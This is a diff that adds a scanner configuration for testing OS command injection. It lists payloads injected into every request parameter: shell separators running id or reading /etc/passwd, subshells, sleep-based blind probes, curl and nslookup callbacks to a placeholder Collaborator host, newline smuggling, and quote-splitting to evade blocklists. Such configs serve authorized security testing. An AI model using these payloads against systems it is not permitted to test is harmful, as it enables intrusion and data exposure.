@@ -1,0 +1,145 @@
+# OS Command Injection Testing Config
+# No filters or targets - payloads applied to all parameters across all requests.
+# Run with --diff-analysis to catch blind injection via response anomalies.
+# Replace YOUR.COLLABORATOR.URL with your Burp Collaborator or interactsh host.
+
+rules:
+  # Rule 1: Direct output injection - Unix & Windows
+  # Attempts to append a command using common shell separators.
+  # Looks for recognisable OS command output in the response body.
+  - payloads:
+      type: list
+      source:
+        - "; id"
+        - "& id"
+        - "| id"
+        - "&& id"
+        - "|| id"
+        - "; whoami"
+        - "| whoami"
+        - "; ls -la"
+        - "| ls"
+        - "; cat /etc/passwd"
+        - "; dir"
+        - "& dir"
+        - "& ipconfig"
+        - "; ifconfig"
+        - "; type C:\\Windows\\win.ini"
+        - "; pwd"
+    conditions:
+      match_mode: "any"
+      regex_in_body: "uid=|gid=|groups=|root:x:0:0|daemon:|www-data|drwxr|total [0-9]+|Volume in drive|Directory of|bytes free|Windows IP Configuration|IPv4 Address|\\[fonts\\]"
+      status_code: 500
+
+  # Rule 2: Subshell and backtick execution
+  # Alternative execution contexts - useful when separator characters
+  # are filtered but subshell syntax is not.
+  - payloads:
+      type: list
+      source:
+        - "$(id)"
+        - "$(whoami)"
+        - "`id`"
+        - "`whoami`"
+        - "$(cat /etc/passwd)"
+        - "`cat /etc/passwd`"
+        - "$(ls -la)"
+        - "$(pwd)"
+    conditions:
+      match_mode: "any"
+      regex_in_body: "uid=|gid=|groups=|root:x:0:0|daemon:|www-data|drwxr|total [0-9]+"
+
+  # Rule 3: Time-based blind injection
+  # Covers Unix sleep, Unix ping, Windows timeout and Windows ping.
+  # A response time spike of ~5s is a strong blind injection indicator.
+  # Run with --diff-analysis and --baseline-file for timing comparison.
+  - payloads:
+      type: list
+      source:
+        - "; sleep 5"
+        - "& sleep 5"
+        - "| sleep 5"
+        - "$(sleep 5)"
+        - "`sleep 5`"
+        - "; ping -c 5 127.0.0.1"
+        - "& ping -n 5 127.0.0.1"
+        - "; timeout /t 5"
+        - "%0a sleep 5"
+    conditions:
+      match_mode: "any"
+      response_time_gt: 4.5
+
+  # Rule 4: OOB blind injection via HTTP/DNS callback
+  # Replace YOUR.COLLABORATOR.URL before running.
+  # No response-level indicators - monitor your OOB receiver.
+  # Timing condition kept as a secondary signal.
+  - payloads:
+      type: list
+      source:
+        - "; curl http://YOUR.COLLABORATOR.URL/cmdi"
+        - "& curl http://YOUR.COLLABORATOR.URL/cmdi"
+        - "| curl http://YOUR.COLLABORATOR.URL/cmdi"
+        - "; wget http://YOUR.COLLABORATOR.URL/cmdi"
+        - "$(curl http://YOUR.COLLABORATOR.URL/cmdi)"
+        - "`curl http://YOUR.COLLABORATOR.URL/cmdi`"
+        - "& nslookup YOUR.COLLABORATOR.URL"
+        - "; nslookup YOUR.COLLABORATOR.URL"
+    conditions:
+      match_mode: "any"
+      response_time_gt: 4.5
+      status_code: 500
+
+  # Rule 5: Newline and null byte injection
+  # Attempts to bypass filters using URL-encoded control characters
+  # to smuggle a second command past input validation.
+  - payloads:
+      type: list
+      source:
+        - "%0a id"
+        - "%0a ls"
+        - "%0a sleep 5"
+        - "%0a whoami"
+        - "%00; ls"
+        - "%0d%0a id"
+        - "%0aid"
+    conditions:
+      match_mode: "any"
+      regex_in_body: "uid=|gid=|root:x:0:0|drwxr|total [0-9]+"
+      response_time_gt: 4.5
+
+  # Rule 6: Filter evasion - quote breaking and path obfuscation
+  # Splits command strings with quotes or uses full paths to bypass
+  # naive blocklists that look for exact command strings.
+  - payloads:
+      type: list
+      source:
+        - ";w'h'o'a'm'i"
+        - ";/bin/cat /etc/passwd"
+        - ";c'a't /etc/passwd"
+        - ";l\\s"
+        - "| i'd'"
+        - ";/usr/bin/id"
+        - ";/bin/sh -c id"
+    conditions:
+      match_mode: "any"
+      regex_in_body: "uid=|gid=|root:x:0:0|daemon:|www-data"
+      status_code: 500
+
+  # Rule 7: Polyglot payloads
+  # Attempts to fire across multiple shell syntaxes and OS types
+  # simultaneously. Uses a safe echo command for broad detection
+  # without relying on specific command output formats.
+  - payloads:
+      type: list
+      source:
+        - "& echo \"cmdi_test\" & echo \"cmdi_test\""
+        - ";echo cmdi_test;echo cmdi_test"
+        - "| echo cmdi_test"
+        - "`echo cmdi_test`"
+        - "$(echo cmdi_test)"
+        - ";echo cmdi_test #"
+        - "%0aecho cmdi_test"
+        - "| echo cmdi_test #"
+    conditions:
+      match_mode: "any"
+      string_in_body: "cmdi_test"
